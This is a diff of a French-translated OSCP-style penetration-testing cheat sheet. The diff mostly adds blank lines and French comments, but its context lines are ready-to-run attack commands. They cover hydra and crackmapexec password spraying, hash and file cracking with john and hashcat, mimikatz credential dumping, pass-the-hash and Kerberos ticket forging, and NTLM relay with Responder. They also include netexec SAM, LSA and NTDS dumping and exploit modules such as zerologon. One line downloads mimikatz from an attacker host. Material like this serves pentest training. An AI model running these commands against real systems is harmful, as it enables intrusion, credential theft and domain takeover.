@@ -46,6 +46,7 @@ hydra -P <wordlist> snmp://<target_ip>
 
 # Redis Brute Force
 hydra -P <password_list> redis://<target_ip>
+
 ```
 
 
@@ -59,6 +60,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ```bash
 # Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
 hydra -L <user_list> -p "<password>" rdp://<target_ip>
+
 ```
 
 
@@ -88,6 +90,7 @@ crackmapexec smtp <target_ip> -u <user_list> -p <password_list> --continue-on-su
 
 # POP3 password spraying
 crackmapexec pop3 <target_ip> -u <user_list> -p <password_list> --continue-on-success
+
 ```
 
 
@@ -102,6 +105,7 @@ office2john <file> > office.hash
 
 # Mot de passe de fichier Crack Office en utilisant John
 john --wordlist=<wordlist> office.hash
+
 ```
 
 
@@ -112,6 +116,7 @@ john --wordlist=<wordlist> office.hash
 
 ```bash
 pdf2john <file.pdf> > pdf.txt
+
 ```
 
 
@@ -119,6 +124,7 @@ pdf2john <file.pdf> > pdf.txt
 
 ```bash
 john --wordlist=<wordlist> pdf.txt
+
 ```
 
 
@@ -126,6 +132,7 @@ john --wordlist=<wordlist> pdf.txt
 
 ```bash
 pdfcrack -f <file.pdf> -w <wordlist>
+
 ```
 
 
@@ -136,6 +143,7 @@ pdfcrack -f <file.pdf> -w <wordlist>
 
 ```bash
 zip2john <file.zip> > zip.hash
+
 ```
 
 
@@ -146,6 +154,7 @@ zip2john <file.zip> > zip.hash
 john zip.hash --wordlist=<wordlist> --format=zip
 # Autre possibilité
 hashcat -m 13600 zip.hash /path/to/wordlist.txt
+
 ```
 
 
@@ -154,6 +163,7 @@ hashcat -m 13600 zip.hash /path/to/wordlist.txt
 ```bash
 # Effectuer une attaque de force brute sur un fichier ZIP protégé par mot de passe
 fcrackzip -u -D -p <wordlist> <file.zip>
+
 ```
 
 
@@ -167,6 +177,7 @@ Examiner les entrées et les réponses de l'application web.
 ```bash
 # HTTP POST brute-force using Hydra
 hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<login_uri>:<user_field>=<username>&<pass_field>=^PASS^:<failure_message>"
+
 ```
 
 
@@ -174,6 +185,7 @@ hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<login_uri>:<user
 
 ```text
 /<login_uri>
+
 ```
 
 
@@ -182,6 +194,7 @@ hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<login_uri>:<user
 <p class="oscp-inline-ref"><strong>Paramètre de formulaire :</strong> <code>&lt;user_field&gt;=&lt;username&gt;&amp;&lt;pass_field&gt;=^PASS^</code></p>
 ```text
 fm_usr=user&fm_pwd=^PASS^
+
 ```
 
 
@@ -189,6 +202,7 @@ fm_usr=user&fm_pwd=^PASS^
 
 ```text
 <failure_message>
+
 ```
 
 
@@ -196,6 +210,7 @@ fm_usr=user&fm_pwd=^PASS^
 
 ```text
 Login failed. Invalid
+
 ```
 
 
@@ -209,6 +224,7 @@ Examiner les entrées et les réponses de l'application web.
 ```bash
 # HTTP GET brute-force attack using Hydra
 hydra -l <username> -P <wordlist> <target_ip> http-get /
+
 ```
 
 
@@ -225,6 +241,7 @@ python3 -c "print(<keyspace>**<length>)"
 
 # Calculate cracking time based on benchmark results
 python3 -c "print(<keyspace> / <hash_rate>)"
+
 ```
 
 
@@ -237,6 +254,7 @@ characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 echo -n $characters | wc -c  # keyspace
 
 python3 -c "print(62**5 / 1000000000)"  # example for 1B hashes per second
+
 ```
 
 
@@ -248,6 +266,7 @@ python3 -c "print(62**5 / 1000000000)"  # example for 1B hashes per second
 ```bash
 # Utilisation de Hashcat avec des attaques basées sur des règles
 hashcat -m <hash_type> <hash_file> <wordlist> -r <rule_file> --force
+
 ```
 
 
@@ -284,6 +303,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```text
 <NTLM_HASH>
+
 ```
 
 
@@ -349,6 +369,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```text
 domain\username:hash:salt
+
 ```
 
 
@@ -363,6 +384,7 @@ domain\username:hash:salt
 
 ```text
 <SHA256_HASH>
+
 ```
 
 
@@ -377,6 +399,7 @@ domain\username:hash:salt
 
 ```text
 <SHA512_HASH>
+
 ```
 
 
@@ -408,6 +431,7 @@ domain\username:hash:salt
 
 ```text
 {MD5}hash
+
 ```
 
 
@@ -441,6 +465,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ```powershell
 # Rechercher la base de données KeePass (.kdbx) sur Windows
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
 ```
 
 
@@ -455,6 +480,7 @@ keepass2john <Database.kdbx> > keepass.hash
 
 # Crack KeePass hachage en utilisant Hashcat (la règle est facultative)
 hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force
+
 ```
 
 
@@ -475,6 +501,7 @@ show [-f] [-a] <entry_id or entry_path>
 
 # Afficher un détail de champ spécifique d'une entrée: (exemple) obtenir 'BACKUP Machine SSH Clé Passer ou obtenir 0 Pass
 get <entry_path or entry_id> <field_name>
+
 ```
 
 
@@ -492,6 +519,7 @@ ssh2john <id_rsa> > ssh.hash
 
 # Crack the SSH key passphrase
 john --wordlist=<password_list> --rules=<rules_file> ssh.hash
+
 ```
 
 
@@ -513,6 +541,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 # 3. Crack the hash
 hashcat -m 1800 [hash_file].txt [path_to_wordlist]
+
 ```
 
 
@@ -570,6 +599,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```text
 lsadump::lsa /inject
+
 ```
 
 
@@ -629,6 +659,7 @@ lsadump::lsa /inject
 
 ```text
 vault::cred /patch
+
 ```
 
 
@@ -639,6 +670,7 @@ vault::cred /patch
 
 ```text
 lsadump::sam /system:<SYSTEM> /sam:<SAM>
+
 ```
 
 
@@ -649,6 +681,7 @@ lsadump::sam /system:<SYSTEM> /sam:<SAM>
 
 ```text
 lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME>
+
 ```
 
 
@@ -664,6 +697,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```text
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>
+
 ```
 
 
@@ -674,6 +708,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>
 
 ```text
 kerberos::ptt <ticket.kirbi>
+
 ```
 
 
@@ -684,6 +719,7 @@ kerberos::ptt <ticket.kirbi>
 
 ```text
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<AES256_HASH> /run:<COMMAND>
+
 ```
 
 
@@ -694,6 +730,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<A
 
 ```text
 kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID> /ticket:<OUTPUT_TICKET>
+
 ```
 
 
@@ -704,6 +741,7 @@ kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KR
 
 ```text
 kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SERVICE/SERVER> /service:<SERVICE> /rc4:<NTLM_HASH> /id:<USER_RID> /ptt
+
 ```
 
 
@@ -714,6 +752,7 @@ kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SE
 
 ```text
 sekurlsa::tickets /export
+
 ```
 
 
@@ -731,6 +770,7 @@ sekurlsa::tickets /export
 
 ```text
 kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_HASH> /service:<SERVICE> /sid:<DOMAIN_SID>
+
 ```
 
 
@@ -741,6 +781,7 @@ kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_H
 
 ```text
 sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>
+
 ```
 
 
@@ -751,6 +792,7 @@ sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>
 
 ```text
 dpapi::cred /in:<CREDENTIAL_FILE>
+
 ```
 
 
@@ -778,6 +820,7 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
 
 # Exemple pour passer le Hash
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.local /rc4:HASH" "exit"
+
 ```
 
 
@@ -785,6 +828,7 @@ mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domai
 
 ```powershell
 mimikatz.exe "privilege::debug" "[command]" "exit" > C:\temp\mimikatz_output.txt
+
 ```
 
 
@@ -796,6 +840,7 @@ $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c
 echo $encodedCommand
 
 powershell -enc <encodedCommand>
+
 ```
 
 
@@ -815,6 +860,7 @@ impacket-vmiexec DOMAIN/username:password@target_ip "C:\\Windows\\System32\\mimi
 # Web Download
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://[attacker_ip]/mimikatz.exe', 'C:\\temp\\mimikatz.exe')"
 powershell -Command "C:\\temp\\mimikatz.exe 'privilege::debug' '[command]' 'exit'"
+
 ```
 
 
@@ -822,6 +868,7 @@ powershell -Command "C:\\temp\\mimikatz.exe 'privilege::debug' '[command]' 'exit
 
 ```powershell
 mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1
+
 ```
 
 
@@ -834,6 +881,7 @@ mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1
 PS C:\tools> .\mimikatz.exe
 mimikatz # privilege::debug
 Privilege '20' OK
+
 ```
 
 
@@ -856,6 +904,7 @@ Local SID : <Local SID>
 RID  : <RID>
 User : <USERNAME>
 Hash NTLM: <NTLM_HASH>
+
 ```
 
 
@@ -864,6 +913,7 @@ Hash NTLM: <NTLM_HASH>
 ```bash
 # Rule is optional
 hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
 ```
 
 
@@ -872,6 +922,7 @@ hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashc
 ```bash
 # Pass-the-Hash en utilisant SMBClient
 impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
+
 ```
 
 
@@ -893,6 +944,7 @@ mimikatz # lsadump::sam
 RID  : <RID>
 User : <USERNAME>
 Hash NTLM: <NTLM_HASH>
+
 ```
 
 
@@ -910,16 +962,18 @@ impacket-wmiexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
 
 # Utilisation de xfreerdp
 xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>
+
 ```
 
 
-## Cracking Net-NTLMv2
+## Analyse des empreintes Net-NTLMv2
 
 
 
 
 ```text
 <interface>
+
 ```
 
 
@@ -931,21 +985,25 @@ xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>
 
 ```text
 <responder_ip>
+
 ```
 
 
 ```text
 <victim_ip>
+
 ```
 
 
 ```text
 <DOMAIN>
+
 ```
 
 
 ```text
 <hash_file>
+
 ```
 
 
@@ -953,6 +1011,7 @@ xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>
 
 ```bash
 sudo responder -I <interface>
+
 ```
 
 
@@ -962,6 +1021,7 @@ sudo responder -I <interface>
 C:\Windows\system32> dir \\<responder_ip>\test
 dir \\<responder_ip>\test
 Access is denied.
+
 ```
 
 
@@ -971,6 +1031,7 @@ Access is denied.
 [SMB] NTLMv2-SSP Client   : ::ffff:<victim_ip>
 [SMB] NTLMv2-SSP Username : <DOMAIN>\emma
 [SMB] NTLMv2-SSP Hash     : emma::<DOMAIN>:<NTLM_HASH>
+
 ```
 
 
@@ -986,6 +1047,7 @@ hashcat (v6.2.5) starting
 ...
 <DOMAIN>\emma::<NTLM_HASH>:123Password123
 ...
+
 ```
 
 
@@ -1000,6 +1062,7 @@ hashcat (v6.2.5) starting
 
 ```text
 <target_ip>
+
 ```
 
 
@@ -1020,6 +1083,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Setting up RAW Server on port 6666
 
 [*] Servers started, waiting for connections
+
 ```
 
 
@@ -1031,6 +1095,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] SMBD-Thread-6: Connection from <victim_ip> controlled, but there are no more targets left!
 ...
 [*] Executed specified command on host: <target_ip>
+
 ```
 
 
@@ -1039,6 +1104,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ```bash
 # Le port doit correspondre au port spécifié dans la commande shell inverse
 nc -nvlp [port]
+
 ```
 
 
@@ -1047,6 +1113,7 @@ nc -nvlp [port]
 ```powershell
 # <responder_ip>: Adresse IP de la machine exécutant le serveur Responder.
 C:\Windows\system32> dir \\<responder_ip>\test
+
 ```
 
 
@@ -1062,6 +1129,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```bash
 sudo pip3 install defaultcreds-cheat-sheet
+
 ```
 
 
@@ -1078,16 +1146,19 @@ creds search tomcat
 | apache tomcat (web)              |   tomcat   |   tomcat   |
 | apache tomcat (web)              |   admin    |   admin    |
 +----------------------------------+------------+------------+
+
 ```
 
 
 ```bash
 creds search [service/web_server/term] export
+
 ```
 
 
 ```bash
 creds update
+
 ```
 
 
@@ -1100,10 +1171,11 @@ creds update --proxy=http://localhost:8080
 
 # Exemple : Rechercher des creds Tomcat et les résultats d'exportation vers /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt
 creds search tomcat --proxy=http://localhost:8080 export
+
 ```
 
 
-### Most Common Credentials
+### Identifiants courants
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -1132,6 +1204,7 @@ operator:operator        # Default operator credentials
 service:service          # Default service account credentials
 postgres:postgres        # Default PostgreSQL credentials
 mysql:mysql              # Default MySQL credentials
+
 ```
 
 
@@ -1171,34 +1244,44 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```bash
 netexec smb target
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 netexec smb target -u '' -p ''
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 netexec smb target -u 'guest' -p ''
+
 ```
 
 
 ```bash
+# Lister les partages SMB
 netexec smb target -u '' -p '' --shares
 
 netexec smb target -u [username] -p [password] --shares
 
 netexec smb target --shares --policies
+
 ```
 
 
 ```bash
+# Lister les groupes
 netexec smb target --groups
+
 ```
 
 
 ```bash
+# Lister les utilisateurs
 netexec smb target -u '' -p '' --users
 
 netexec smb target -u [username] -p [password] --users
@@ -1206,6 +1289,7 @@ netexec smb target -u [username] -p [password] --users
 netexec smb target -u '' -p '' --rid-brute
 
 netexec smb target -u '' -p '' --rid-brute --rid-range 500-1100
+
 ```
 
 
@@ -1267,6 +1351,7 @@ Most likely local admin ✅
 ```bash
 netexec smb target -u [username] -p '[P@$$w0rd!]'
 netexec smb target -u [username] -p 'password with spaces'
+
 ```
 
 
@@ -1292,13 +1377,16 @@ netexec smb target -u [usernames].txt -p [password]s.txt --no-bruteforce --conti
 
 # SSH
 netexec ssh target -u [username] -p [password] --continue-on-success
+
 ```
 
 
 ```bash
+# Interroger le service avec NetExec
 netexec [protocol] [target(s)] -u [usernames].txt -p [passwords.txt] --no-bruteforce
 
 netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-bruteforce
+
 ```
 
 
@@ -1307,12 +1395,14 @@ netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-brut
 ```text
 user1 -> pass1
 user2 -> pass2
+
 ```
 
 
 
 
 ```bash
+# Vérifier l'accès SMB
 netexec smb target -u [username] -p '[password]' --local-auth
 netexec smb [target] -u [username] -H '[LM:NT]' --local-auth
 netexec smb [target] -u [username] -H '[NTHASH]' --local-auth
@@ -1321,6 +1411,7 @@ netexec smb [target] -u [username] -H '[NTHASH]' --local-auth
 netexec smb [target] -u '' -p '' --local-auth
 netexec smb [target] -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
 netexec smb [target] -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
+
 ```
 
 
@@ -1331,7 +1422,9 @@ netexec smb [target] -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc
 
 
 ```bash
+# Vérifier l'accès SMB
 netexec smb target -u [username] -p [password] -k
+
 ```
 
 
@@ -1344,18 +1437,23 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 netexec smb target -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+
 ```
 
 
 ```bash
+# Utiliser le module spider_plus
 netexec smb target -u [username] -p [password] -M spider_plus
 
 netexec smb target -u [username] -p [password] -M spider_plus -o READ_ONLY=false
+
 ```
 
 
 ```bash
+# Télécharger le fichier indiqué
 netexec smb target -u [username] -p [password] -k --get-file target_file output_file --share sharename
+
 ```
 
 
@@ -1368,16 +1466,21 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 
 ```bash
 netexec ftp target -u [username] -p [password] --ls
+
 ```
 
 
 ```bash
+# Interroger le service avec NetExec
 netexec ftp target -u [username] -p [password] --ls folder_name
+
 ```
 
 
 ```bash
+# Interroger le service avec NetExec
 netexec ftp target -u [username] -p [password] --ls folder_name --get file_name
+
 ```
 
 
@@ -1390,21 +1493,28 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 netexec ldap target -u '' -p '' --users
+
 ```
 
 
 ```bash
+# Lister les utilisateurs
 netexec ldap target -u [username] -p [password] --trusted-for-delegation  --[password]-not-required --admin-count --users --groups
+
 ```
 
 
 ```bash
+# Vérifier l'accès LDAP
 netexec ldap target -u [username] -p [password] --kerberoasting kerb.txt
+
 ```
 
 
 ```bash
+# Vérifier l'accès LDAP
 netexec ldap target -u [username] -p [password] --asreproast asrep.txt
+
 ```
 
 
@@ -1417,6 +1527,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ```bash
 netexec mssql target -u [username] -p [password]
+
 ```
 
 
@@ -1427,12 +1538,16 @@ netexec mssql target -u [username] -p [password]
 
 
 ```bash
+# Exécuter une commande distante
 netexec mssql target -u [username] -p [password] -x [command_to_execute]
+
 ```
 
 
 ```bash
+# Télécharger le fichier indiqué
 netexec mssql target -u [username] -p [password] --get-file output_file target_file
+
 ```
 
 
@@ -1443,6 +1558,7 @@ netexec mssql target -u [username] -p [password] --get-file output_file target_f
 
 ```bash
 nxc smb target -u [username] -p [password] --sam
+
 ```
 
 
@@ -1452,11 +1568,14 @@ nxc smb target -u [username] -p [password] --sam
 netexec smb target -u [username] -p [password] --local-auth --lsa
 
 # Un compte dont le nom commence par _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} peut être lié à un compte gMSA ; vérifier l'association avec la méthode ci-dessous.
+
 ```
 
 
 ```bash
+# Examiner les données NTDS accessibles
 netexec smb target -u [username] -p [password] --ntds
+
 ```
 
 
@@ -1471,25 +1590,32 @@ nxc smb target -u [username] -p [password] -M nanodump
 
 # Utilisation de Mimikatz (déprécié) : vous avez besoin d'au moins un privilège d'administration local sur la cible distante, utilisez l'option --local-auth si votre utilisateur est un compte local
 nxc smb target -u [username] -p [password] -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
+
 ```
 
 
 
 
 ```bash
+# Vérifier l'accès LDAP
 netexec ldap target -u [username] -p [password] --gmsa-convert-id id
 
 netexec ldap domain -u [username] -p [password] --gmsa-decrypt-lsa gmsa_account
+
 ```
 
 
 ```bash
+# Utiliser le module gpp_[password]
 netexec smb [target] -u [username] -p [password] -M gpp_[password]
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 netexec smb [target] -u [username] -p [password] --laps
+
 ```
 
 
@@ -1500,12 +1626,16 @@ netexec smb [target] -u [username] -p [password] --laps
 
 
 ```bash
+# Vérifier l'accès SMB
 netexec smb [target] -u [username] -p [password] --laps --dpapi
+
 ```
 
 
 ```bash
+# Utiliser le module wifi
 netexec smb [target] -u [username] -p [password] -M wifi
+
 ```
 
 
@@ -1516,6 +1646,7 @@ netexec smb [target] -u [username] -p [password] -M wifi
 nxc smb [target] -u [username] -p [password] -M keepass_discover
 
 nxc smb [target] -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
+
 ```
 
 
@@ -1528,6 +1659,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```text
 ~/.nxc/nxc.conf
+
 ```
 
 
@@ -1538,6 +1670,7 @@ bh_uri = 127.0.0.1
 bh_port = 7687
 bh_user = user
 bh_pass = pass
+
 ```
 
 
@@ -1545,6 +1678,7 @@ bh_pass = pass
 
 ```bash
 netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collection All
+
 ```
 
 
@@ -1557,6 +1691,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```bash
 netexec smb ip -u [username] -p [password] -M webdav 
+
 ```
 
 
@@ -1567,6 +1702,7 @@ netexec smb ip -u [username] -p [password] -M webdav
 
 ```bash
 netexec smb [target] -u [username] -p [password] -M veeam
+
 ```
 
 
@@ -1577,6 +1713,7 @@ netexec smb [target] -u [username] -p [password] -M veeam
 
 ```bash
 netexec smb ip -u [username] -p [password] -M slinky 
+
 ```
 
 
@@ -1587,6 +1724,7 @@ netexec smb ip -u [username] -p [password] -M slinky
 
 ```bash
 netexec smb ip -u [username] -p [password] -M ntdsutil 
+
 ```
 
 
@@ -1599,6 +1737,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M ldap-checker
+
 ```
 
 
@@ -1613,6 +1752,7 @@ netexec smb [target] -u [username] -p [password] -M zerologon
 netexec smb [target] -u [username] -p [password] -M petitpotam
 
 netexec smb [target] -u [username] -p [password] -M nopac
+
 ```
 
 
@@ -1623,6 +1763,7 @@ netexec smb [target] -u [username] -p [password] -M nopac
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M maq
+
 ```
 
 
@@ -1633,6 +1774,7 @@ netexec ldap [target] -u [username] -p [password] -M maq
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M adcs
+
 ```
 
 
@@ -1645,10 +1787,11 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```bash
 netexec smb [target] -u [username] -p [password] -M msol
+
 ```
 
 
-#### NTLM Relay Attack
+#### Relais NTLM
 
 
 <p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
@@ -1669,6 +1812,7 @@ SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WI
 cat relay_list.txt
 192.168.1.111
 192.168.1.117
+
 ```
 
 
@@ -1676,6 +1820,7 @@ cat relay_list.txt
 
 ```bash
 responder -I eth0
+
 ```
 
 
@@ -1683,6 +1828,7 @@ responder -I eth0
 
 ```bash
 impacket-ntlmrelayx -tf relay.txt -smb2support
+
 ```
 
 
@@ -1693,6 +1839,7 @@ impacket-ntlmrelayx -tf relay.txt -smb2support
 
 ```bash
 nxc smb [target] -u [localAdmin] -p [password] --loggedon-users
+
 ```
 
 
@@ -1700,6 +1847,7 @@ nxc smb [target] -u [localAdmin] -p [password] --loggedon-users
 nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-user] CMD=[cmd-command]
 
 # Commande personnalisée pour ajouter un utilisateur au groupe d'administration de domaine : powershell.exe \"Invoke-Command -ComputerName [DC_NAME] -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
+
 ```
 
 ![Impersonate Logged In Users with NetExec.](https://www.emmanuelsolis.com/img/netexec_01.png)
@@ -1714,6 +1862,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 netexec [protocol] [target(s)] -u FILE -p password
+
 ```
 
 
@@ -1722,6 +1871,7 @@ netexec [protocol] [target(s)] -u FILE -p password
 ```text
 DOMAIN1\user
 DOMAIN2\user
+
 ```
 
 
@@ -1729,6 +1879,7 @@ DOMAIN2\user
 
 ```text
 [domains]\[users]
+
 ```
 
 
@@ -1736,6 +1887,7 @@ DOMAIN2\user
 
 ```bash
 python3 script.py -u [users_list].txt -d [domains_list].txt
+
 ```
 
 
@@ -1774,6 +1926,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 ```
 
 ---
